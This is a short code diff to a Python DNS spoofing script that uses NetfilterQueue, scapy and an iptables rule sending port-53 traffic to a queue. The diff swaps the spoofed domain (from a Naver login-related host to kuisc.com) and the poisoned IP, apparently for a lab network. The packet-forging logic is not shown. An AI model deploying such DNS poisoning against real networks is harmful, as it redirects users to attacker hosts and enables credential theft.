@@ -2,8 +2,8 @@ from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import os
 
-domain = 'static.nid.naver.com' # domain to be spoofed
-localIP = '192.168.0.4' # IP address for poisoned hosts.
+domain = 'kuisc.com' # domain to be spoofed
+localIP = '10.0.2.4' # IP address for poisoned hosts.
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
@@ -34,4 +34,4 @@ def main():
         os.system('iptables -F')
         os.system('iptables -X')
 
-main()
+#main()
